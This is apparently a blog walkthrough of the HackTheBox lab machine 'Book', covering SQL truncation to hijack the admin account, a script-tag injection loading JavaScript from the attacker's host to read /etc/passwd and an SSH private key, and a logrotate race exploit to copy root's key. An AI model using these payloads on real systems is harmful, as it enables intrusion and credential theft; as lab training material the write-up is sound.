# abstract

Book is a medium rated box from [@MrR3boot](https://twitter.com/MrR3boot){:target="_blank"}. The vulnerabilities in this box are, in my opinion
not so easy to spot. First you use a SQL truncation attack to conquer the web panel as admin. Then you use LFI in connection with SSRF
to read files on the server. Once on the machine you have to exploit a vulnerability in Logrotate and be fast to access the Root Account.

There are only two open ports. Since not much can be transmitted via port 22 I can directly take care of port 80.

## Web app on port 80

![book.htb](../../../../assets/images/hackthebox/book/0_book.htb.png)

The website seems to be login protected, but you can also create your own account.

Maybe I can find some initial foothold with ffuf.

## ffuf on port 80

```bash

```

The result is somewhat sobering. Most files redirect to the index.php with the code 302.
There are however the directories admin and docs which answer with 301 forbidden.

But maybe I can find something interesting under /admin/.

![admin login](../../../../assets/images/hackthebox/book/1_admin.png)

The website looks similar to the previous one, except that the registration is not available here.

So now I try to create an account and log in with it.

![loggedIn](../../../../assets/images/hackthebox/book/2_logged_in.png)

After successful registration I can log in with the user atm.

The functionality of the website is quite limited, I can view collections and upload books myself.

At this point I spent a relatively long time to find something vulnerable. I tried a lot of different things, but it seems I need a valid admin account to go ahead.

# access to admin

In my research I came across the following source: [SQL-Truncation](https://resources.infosecinstitute.com/sql-truncation-attack/){:target="_blank"}

With a SQL truncation I could overwrite the password of the admin account, but first I have to find out what the admin account could be called.

![register admin](../../../../assets/images/hackthebox/book/3_register_admin.png)
![user exists](../../../../assets/images/hackthebox/book/4_user_exists.png)

Ok that seems to have worked, there is an admin user with the email address admin@book.htb.

Now I'll have a look at the request with Burp.

![burp](../../../../assets/images/hackthebox/book/5_burp.png)

With this request the page delivers a status code 200 and the information that the user account already exists.

If I now modify the parameters accordingly, it might work.

For this I add 15 whitespaces to the user admin and atm. This gives me 20 characters for the user name.

I do the same with the email, I fill the address with whitespaces up to 20 characters and add any email address.

I assign the password freely and send the request.

![burp works](../../../../assets/images/hackthebox/book/6_burp_works.png)

The web server now returns a status 302 instead of 200. Maybe this has already worked.

I'm trying to log in with the email admin@book.htb and the password I have assigned.

![admin panel](../../../../assets/images/hackthebox/book/7_admin_panel.png)

Bingo, we are admin on the web interface, this method was unknown to me before.

The admin interface is somewhat similar to the normal user interface, but there is a function that creates a PDF of the previous collections.

![admin collection](../../../../assets/images/hackthebox/book/8_admin_collection.png)

If you click on the link PDF, the PDF will be created in the background, so this could be a gateway.
As soon as you start inserting code, the created PDF is changed, or is empty.

# exploit

As a normal user I tried to inject code via the Book Title field. This did not always work that well, so I created a local JavaScript file and loaded
this file to the target via a web server. This also has the advantage that if I make changes to my exploit, I only have to create a new PDF as admin and the code will
automatically downloaded from my computer.

Here is the line I use as Book Title.

```html
<script src="http://10.10.14.34:9090/exploit.js"></script>
```

The file that is additionally uploaded with is arbitrary.

![begin exploitation](../../../../assets/images/hackthebox/book/9_begin_exploit.png)

My first approach should try to read a local file on the server and write the content to the PDF.

```js
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");x.send();
```

It works, now I have the possibility to upload files from the server, I have tried a lot.

![begin exploitation](../../../../assets/images/hackthebox/book/10_passwd.png)

Finally I found an SSH key in the home directory of the user Reader. But the key itself can't be written correctly into the PDF, so I add a line break after 40 characters to my exploit.

```js
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText.replace(/(.{40})/g, "$1<br>"))};
x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();
```

This looks very good, so I have the private key of the user reader.

![rsa key](../../../../assets/images/hackthebox/book/11_key.png)

Let's see if this works.

![ssh access](../../../../assets/images/hackthebox/book/12_ssh_access.png)

That's it, the user has fallen. Proceed to the root account.

# privilege escalation

First I load LinEnum on the target and look for something suspicious, but I don't find anything that needs further research. So is this where it ends?

Of course not, if you don't find anything with LinEnum you might have the possibility to investigate currently running processes. For this I use pspy here.

![pspy64](../../../../assets/images/hackthebox/book/13_pspy64.png)

With pspy I find out that logrotate is always executed, which is a bit strange in this interval. Therefore I take a closer look at logrotate.

```bash
reader@book:~$ logrotate -v
logrotate 3.11.0 - Copyright (C) 1995-2001 Red Hat, Inc.
This may be freely redistributed under the terms of the GNU Public License
```

Version 3.11.0 is used, after a short research at [exploit-db.com](https://www.exploit-db.com/exploits/47466){:target="_blank"} I came across logrotten.

Here is a more detailed description of [Logrotten](https://tech.feedyourhead.at/content/privilege-escalation-via-logrotate-freeradius){:target="_blank"}.

At github [whotwagner/logrotten](https://github.com/whotwagner/logrotten){:target="_blank"} there is already a prepared source code.

I downloaded and compiled the code, then it was transferred to the target. The exploit is a bit tricky to use, so here's a quick explanation.

I need 3 open terminals on the target, in terminal 1 I start logrotten with the path to the logfile which is rotated.

Afterwards I change the logfile several times to trigger logrotate. As soon as logrotate triggers we find a file in terminal 3 under /etc/bash_completion.d, into this
file can now write everything that should be executed when a user logs in.

# root

Here logrotten is started with the target on /home/reader/backups/access.log

![logrotten setup](../../../../assets/images/hackthebox/book/14_setup_logrotten.png)

Now in Terminal 2 quickly change the log.

![push content](../../../../assets/images/hackthebox/book/15_push_content.png)

Logrotate is started and I have created a file in /etc/bash_completion.d 

![access.log](../../../../assets/images/hackthebox/book/16_access.png)

On my first attempt I used a nc command and thus got a reverse shell as root. But this was relatively unstable. Through LinEnum I found out that the user root can also login via SSH.
Therefore I simply copied and downloaded his SSH key in the second attempt.

```bash
cp /root/.ssh/id_rsa /tmp/key
chown reader.reader /tmp/key
```
![rootkey](../../../../assets/images/hackthebox/book/17_rootkey.png)

The key is valid and I can log in as root.

![rooted](../../../../assets/images/hackthebox/book/18_rooted.png)

That was it, book was successfully owned.
